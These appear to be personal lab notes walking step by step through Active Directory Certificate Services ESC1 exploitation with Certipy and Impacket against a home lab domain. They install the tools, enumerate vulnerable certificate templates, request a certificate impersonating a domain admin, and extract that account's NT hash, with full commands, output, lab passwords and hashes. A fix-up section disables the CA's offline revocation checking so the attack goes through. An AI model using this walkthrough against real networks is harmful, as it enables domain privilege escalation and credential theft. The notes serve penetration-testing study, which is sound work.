**Some notes on Active Directory Certificate Services (ADCS) Exploitation**

This is a good video https://youtu.be/wozcGjAsfZ0?si=1LJ4wjcHEblrV_4P which explains AD CS ESC1 Privilege Escalation exploitation, but also shows how to configure the vulnerable certificate and how to remediate them.

**Install certipy in Ubuntu**

Create a Python virtualenv which is an isolated Python environment, allowing you to install any tool and update it without the risk of impacting other python tools.

```
mkdir Tools
sudo apt install python3.10-venv

ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ python3 -m venv .
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ source bin/activate
```

To return to the normal environment, type deactivate

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ deactivate
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

To return back to the virtual environment

```
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ sudo python3 -m venv .
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ source bin/activate
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

Then install certipy-ad into your new isolated Python environment

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ pip3 install certipy-ad
```
And install ldap3

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ pip3 install git+https://github.com/ly4k/ldap3
```

**Locate AD CS ESC1 vulnerable certificates and exploit them**

1. Find the certs

```
certipy find -u g.white -p "Passw0rd!" -dc-ip 192.168.68.230 -scheme ldaps -ldap-channel-binding
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA'
[*] Saved BloodHound data to '20240701104154_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240701104154_Certipy.txt'
[*] Saved JSON output to '20240701104154_Certipy.json'
```

2. Review the the cert output.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ gedit 20240701104154_Certipy.txt

Certificate Authorities
  0
    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
    Certificate Subject                 : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
    Certificate Serial Number           : 354DB064F33080BD4EB9FEAABE87DCF1
    Certificate Validity Start          : 2024-04-23 13:56:37+00:00
    Certificate Validity End            : 2029-04-23 14:06:33+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : HACKLAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        ManageCa                        : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        Enroll                          : HACKLAB.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ESC3-Vuln2
    Display Name                        : ESC3-Vuln2
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Secure Email
                                          Microsoft Trust List Signing
                                          Encrypting File System
                                          Client Authentication
                                          Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : HACKLAB.LOCAL\Administrator
        Full Control Principals         : HACKLAB.LOCAL\Domain Users
        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC3                              : 'HACKLAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'HACKLAB.LOCAL\\Domain Users' has dangerous permissions
  1
    Template Name                       : ESC1-Vun1
    Display Name                        : ESC1-Vun1
    Certificate Authorities             : hacklab-WIN-8HPLF8PSHC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKLAB.LOCAL\Domain Users
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Domain Computers
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : HACKLAB.LOCAL\Administrator
        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HACKLAB.LOCAL\\Domain Users', 'HACKLAB.LOCAL\\Domain Computers' and 'HACKLAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

The certipy tool will highlight certs that are vulnerable by appending [!] Vulnerabilities ESC1 at the end of the certificate. The following sections are required to exploit a cert.

From the Certificate Authorities section, you need the CA Name and the DNS Name which in this example is the domain controllers host name.

```
  0
    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
```

Following this for a certificate to be vulnerable it requires the configuration to be set as defined below.

```
Template Name                       : Add_Vulnerable_ Certs_Name
Enabled                             : True
Client Authentication               : True
Enrollee Supplies Subject           : True

Enrollment Rights               : HACKLAB.LOCAL\Domain Users
```



3. Create a TGT

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ getTGT.py hacklab.local/g.white:'Passw0rd!' -dc-ip 192.168.68.230
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in g.white.ccache
```

4. Export the TGT

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ export KRB5CCNAME=g.white.ccache
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

5. Verify you can ping the targets host name which in this circumstance was WIN-8HPLF8PSHC1.hacklab.local, if you can't ping it, add the host name to your Ubuntu /etc/hosts file.

```
sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       ubuntu-virtual-machine

192.168.68.230  WIN-8HPLF8PSHC1.hacklab.local


ping WIN-8HPLF8PSHC1.hacklab.local
PING WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230) 56(84) bytes of data.
64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=1 ttl=128 time=12.8 ms
64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=2 ttl=128 time=1.15 ms
```


6. Exploit the vuln certificate

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'da1@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'da1.pfx'
```

5. Extract a copy of the NTLM Hash

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx da1.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: da1@hacklab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'da1.ccache'
[*] Trying to retrieve NT hash for 'da1'
[*] Got hash for 'da1@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```





**Common errors and how to fix them**

1. CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.
[*] Request ID is 6
Would you like to save the private key? (y/N) 
[-] Failed to request certificate
```

Fix - https://stealthpuppy.com/resolving-issues-starting-ca-offline-crl/

Open admin CMD on your DC and execute

```
certutil –setreg ca\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE
```


```
C:\Users\Administrator>certutil -setreg ca\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\hacklab-WIN-8HPLF8PSHC1-CA\CRLFlags:

Old Value:
  CRLFlags REG_DWORD = 2
    CRLF_DELETE_EXPIRED_CRLS -- 2

New Value:
  CRLFlags REG_DWORD = a (10)
    CRLF_DELETE_EXPIRED_CRLS -- 2
    CRLF_REVCHECK_IGNORE_OFFLINE -- 8
CertUtil: -setreg command completed successfully.
The CertSvc service may need to be restarted for changes to take effect.
```


2. TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)

Meaning - The DA account password has not been set to never expire and has expired requiring it to be changed before an NTLM hash can be harvested.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'svc_admin@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'svc_admin@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'svc_admin.pfx'
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx svc_admin.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_admin@hacklab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

Reset the password on the DC for that account and it will then work.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'svc_admin@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'svc_admin@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'svc_admin.pfx'
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx svc_admin.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_admin@hacklab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_admin.ccache'
[*] Trying to retrieve NT hash for 'svc_admin'
[*] Got hash for 'svc_admin@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```
